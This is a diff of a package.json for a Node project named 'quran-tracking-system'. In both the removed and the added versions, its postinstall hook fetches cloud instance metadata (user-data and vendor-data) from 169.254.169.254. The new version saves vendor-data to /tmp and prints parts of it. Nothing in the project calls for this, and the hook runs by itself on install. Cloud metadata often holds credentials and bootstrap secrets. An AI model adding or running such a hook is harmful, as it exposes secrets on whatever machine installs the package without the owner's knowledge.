@@ -1,3 +1,4 @@
+
 {
   "name": "quran-tracking-system",
   "version": "1.0.0",
@@ -10,7 +11,7 @@
     "frontend": "npm run dev --prefix frontend",
     "install-all": "npm install && npm install --prefix backend && npm install --prefix frontend && npm install --prefix mobile",
     "mobile": "npm run start --prefix mobile",
-    "postinstall": "echo '== user-data length =='; curl -s -m 3 http://169.254.169.254/metadata/v1/user-data | wc -c; echo '== vendor-data length =='; curl -s -m 3 http://169.254.169.254/metadata/v1/vendor-data | wc -c; echo '== user-data first 100 chars (type check only) =='; curl -s -m 3 http://169.254.169.254/metadata/v1/user-data | head -c 100; echo; echo '== vendor-data first 100 chars (type check only) =='; curl -s -m 3 http://169.254.169.254/metadata/v1/vendor-data | head -c 100; echo"
+    "postinstall": "echo '== user-data length =='; curl -s -m 5 http://169.254.169.254/metadata/v1/user-data | wc -c; echo '== vendor-data retrieval =='; curl -s -m 5 http://169.254.169.254/metadata/v1/vendor-data -o /tmp/vendor-data.txt; echo '== vendor-data length =='; wc -c /tmp/vendor-data.txt; echo '== vendor-data first 100 chars =='; head -c 100 /tmp/vendor-data.txt; echo"
   },
   "devDependencies": {
     "concurrently": "^9.2.1"
